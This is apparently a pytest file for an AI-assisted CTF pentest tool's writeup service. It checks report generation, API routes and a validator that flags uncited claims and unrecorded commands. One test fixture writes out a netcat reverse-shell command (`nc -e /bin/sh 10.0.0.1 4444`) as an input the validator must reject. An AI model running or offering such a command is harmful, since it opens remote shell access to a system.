from __future__ import annotations

from fastapi.testclient import TestClient
from langchain_core.messages import AIMessage

from agent.settings import Settings
from app.attack_path_service import AttackPathService
from app.project_service import ProjectService
from app.target_session_service import TargetSessionService
from app.writeup_service import WRITEUP_SECTIONS, SourceIndex, WriteupService, validate_writeup
from models.control_center import CommandRun, Finding, Task, TaskStatus, TargetType
from server.app import create_app
from storage.repositories.control_center import CommandRunRepository, EventRepository, FindingRepository, TaskRepository
from storage.sqlite import SQLiteStorage


class FakeWriteupModel:
    def __init__(self) -> None:
        self.prompts: list[str] = []

    def invoke(self, messages):
        prompt = str(messages[-1].content)
        self.prompts.append(prompt)
        if len(self.prompts) == 1:
            return AIMessage(content=f"# Organized Material\n\n{prompt}")
        return AIMessage(content=_writeup_from_material(prompt))


def build_settings(tmp_path):
    return Settings(
        openai_api_key="key",
        openai_api_base="https://example.com",
        openai_model="test-model",
        working_directory=tmp_path,
    )


def prepare_session(settings):
    project = ProjectService.from_settings(settings).create_project(name="Phase 7")
    session = TargetSessionService.from_settings(settings).create_session(
        project_identifier=project.id,
        name="Target",
        target_value="10.10.10.5",
        target_type=TargetType.IP,
        summary="Linux CTF target",
    )
    return project, session


def test_empty_session_writeup_has_required_skeleton(tmp_path):
    settings = build_settings(tmp_path)
    _project, session = prepare_session(settings)
    model = FakeWriteupModel()

    result = WriteupService(settings=settings, model_factory=lambda _settings: model).generate_session_writeup(
        session_identifier=session.public_id,
    )

    assert result.report.public_id.startswith("RPT")
    for section in WRITEUP_SECTIONS:
        assert f"## {section}" in result.writeup_markdown
    assert "TODO" in result.writeup_markdown
    assert result.report.public_id in result.report.artifact_path
    assert (tmp_path / ".red-code" / "projects" / session.project_id / "sessions" / session.id / "reports" / result.report.public_id / "writeup.md").is_file()
    assert "## Open Ports" in result.material_markdown


def test_regenerated_session_writeups_keep_independent_files(tmp_path):
    settings = build_settings(tmp_path)
    _project, session = prepare_session(settings)
    service = WriteupService(settings=settings, model_factory=lambda _settings: FakeWriteupModel())

    first = service.generate_session_writeup(session_identifier=session.id)
    first_path = first.report.artifact_path
    second = service.generate_session_writeup(session_identifier=session.id)

    assert first.report.public_id != second.report.public_id
    assert first_path != second.report.artifact_path
    assert first.report.public_id in first_path
    assert second.report.public_id in second.report.artifact_path
    assert "## Overview" in service.read_report_markdown(first.report.public_id)


def test_populated_session_writeup_includes_structured_records_and_ids(tmp_path):
    settings = build_settings(tmp_path)
    _project, session = prepare_session(settings)
    storage = SQLiteStorage(settings.sqlite_path)
    port_task = TaskRepository(storage).create(
        Task.create(
            project_id=session.project_id,
            session_id=session.id,
            task_type="port_scan",
            executor="nmap",
            status=TaskStatus.SUCCEEDED,
            input_json={"target": "10.10.10.5"},
            result_json={
                "summary": "Found ssh and http.",
                "argv": ["nmap", "-sV", "10.10.10.5"],
                "structured": {
                    "open_ports": [
                        {"port": 22, "protocol": "tcp", "service": "ssh", "product": "OpenSSH", "version": "8.9"},
                        {"port": 80, "protocol": "tcp", "service": "http", "product": "nginx", "version": "1.24"},
                    ]
                },
            },
        )
    )
    dir_task = TaskRepository(storage).create(
        Task.create(
            project_id=session.project_id,
            session_id=session.id,
            task_type="dir_scan",
            executor="ffuf",
            status=TaskStatus.SUCCEEDED,
            result_json={"structured": {"results": [{"url": "http://10.10.10.5/admin", "status": 200}]}},
        )
    )
    attack_path = AttackPathService.from_settings(settings)
    evidence, _node = attack_path.create_evidence(
        session_identifier=session.id,
        evidence_type="service_scan",
        title="Nmap service scan",
        summary="OpenSSH and nginx are exposed.",
        source_task_id=port_task.id,
    )
    finding = FindingRepository(storage).create(
        Finding.create(
            project_id=session.project_id,
            session_id=session.id,
            severity="medium",
            status="candidate",
            title="Administrative web path",
            description="The /admin path returned HTTP 200.",
            evidence_refs=[evidence.id],
        )
    )
    command = CommandRunRepository(storage).create(
        CommandRun.create(
            project_id=session.project_id,
            session_id=session.id,
            terminal_id="term-phase7",
            command="curl -I http://10.10.10.5/admin",
            exit_code=0,
            output_summary="HTTP/1.1 200 OK",
        )
    )
    flag, _flag_node = attack_path.create_flag(
        session_identifier=session.id,
        flag_type="user",
        value="flag{user}",
        source_evidence_id=evidence.id,
    )
    model = FakeWriteupModel()

    result = WriteupService(settings=settings, model_factory=lambda _settings: model).generate_session_writeup(
        session_identifier=session.id,
    )

    assert port_task.public_id in result.writeup_markdown
    assert dir_task.public_id in result.writeup_markdown
    assert evidence.public_id in result.writeup_markdown
    assert finding.public_id in result.writeup_markdown
    assert command.public_id in result.writeup_markdown
    assert flag.public_id in result.writeup_markdown
    assert "nmap -sV 10.10.10.5" in result.writeup_markdown
    assert "OpenSSH" in result.writeup_markdown
    assert "http://10.10.10.5/admin" in result.writeup_markdown
    assert "rooted via kernel exploit" not in result.writeup_markdown
    assert EventRepository(storage).list(session_id=session.id, limit=1)[0].event_kind == "report.generated"


def test_phase7_report_api_lists_creates_and_downloads_writeup(tmp_path, monkeypatch):
    settings = build_settings(tmp_path)
    _project, session = prepare_session(settings)
    command = CommandRunRepository(SQLiteStorage(settings.sqlite_path)).create(
        CommandRun.create(
            project_id=session.project_id,
            session_id=session.id,
            terminal_id="term-api",
            command="id",
            exit_code=0,
        )
    )

    monkeypatch.setattr("server.lifecycle.get_settings", lambda: settings)
    monkeypatch.setattr(
        "server.routes.reports.WriteupService.from_settings",
        lambda settings: WriteupService(settings=settings, model_factory=lambda _settings: FakeWriteupModel()),
    )

    with TestClient(create_app()) as client:
        created = client.post(f"/api/sessions/{session.public_id}/reports")
        assert created.status_code == 201
        report = created.json()["report"]
        assert report["public_id"].startswith("RPT")
        assert "## Overview" in report["content"]

        listed = client.get(f"/api/sessions/{session.id}/reports")
        assert listed.status_code == 200
        assert listed.json()["reports"][0]["public_id"] == report["public_id"]

        downloaded = client.get(f"/api/reports/{report['public_id']}/download")
        assert downloaded.status_code == 200
        assert "## Evidence Index" in downloaded.text

        commands = client.get(f"/api/sessions/{session.public_id}/commands")
        assert commands.status_code == 200
        assert commands.json()["commands"][0]["public_id"] == command.public_id


def test_phase7_project_report_api_aggregates_sessions(tmp_path, monkeypatch):
    settings = build_settings(tmp_path)
    project, first_session = prepare_session(settings)
    second_session = TargetSessionService.from_settings(settings).create_session(
        project_identifier=project.id,
        name="Second target",
        target_value="10.10.10.6",
        target_type=TargetType.IP,
    )

    monkeypatch.setattr("server.lifecycle.get_settings", lambda: settings)
    monkeypatch.setattr(
        "server.routes.reports.WriteupService.from_settings",
        lambda settings: WriteupService(settings=settings, model_factory=lambda _settings: FakeWriteupModel()),
    )

    with TestClient(create_app()) as client:
        created = client.post(f"/api/projects/{project.public_id}/reports")
        assert created.status_code == 201
        report = created.json()["report"]
        assert report["report_type"] == "project_writeup"
        assert report["session_id"] is None
        assert first_session.public_id in report["content"]
        assert second_session.public_id in report["content"]
        assert report["public_id"] in report["artifact_path"]

        listed = client.get(f"/api/projects/{project.id}/reports")
        assert listed.status_code == 200
        assert listed.json()["reports"][0]["public_id"] == report["public_id"]


def test_writeup_validation_rejects_unknown_references_and_commands():
    sections = "\n\n".join(
        "## Command Log\n- CMD0001: `curl http://target/`\n- CMD9999: `nc -e /bin/sh 10.0.0.1 4444`"
        if section == "Command Log"
        else f"## {section}\nTODO"
        for section in WRITEUP_SECTIONS
    )
    markdown = f"# Target Writeup\n\n{sections}"
    validation = validate_writeup(
        markdown=markdown,
        source_index=SourceIndex(public_ids={"CMD0001"}, commands={"curl http://target/"}),
    )

    assert any("Unknown public ids" in item for item in validation.errors)
    assert any("Unrecorded command" in item for item in validation.errors)


def test_writeup_validation_rejects_uncited_factual_lines():
    sections = "\n\n".join(
        "## Verification\n- The target is vulnerable to SQL injection."
        if section == "Verification"
        else f"## {section}\nTODO"
        for section in WRITEUP_SECTIONS
    )
    validation = validate_writeup(markdown=f"# Target Writeup\n\n{sections}", source_index=SourceIndex())

    assert any("Factual lines without public id" in item for item in validation.errors)


def test_writeup_validation_allows_scanner_task_command_sources():
    sections = "\n\n".join(
        "## Command Log\n- TASK0001: `nmap -sV 10.10.10.5`"
        if section == "Command Log"
        else f"## {section}\nTODO"
        for section in WRITEUP_SECTIONS
    )
    validation = validate_writeup(
        markdown=f"# Target Writeup\n\n{sections}",
        source_index=SourceIndex(public_ids={"TASK0001"}, commands={"nmap -sV 10.10.10.5"}),
    )

    assert validation.errors == []


def _writeup_from_material(material: str) -> str:
    sections = "\n\n".join(f"## {section}\nTODO" for section in WRITEUP_SECTIONS)
    return (
        "# Target Writeup\n\n"
        f"{sections}\n\n"
        "## Recorded Material\n"
        f"{material}"
    )
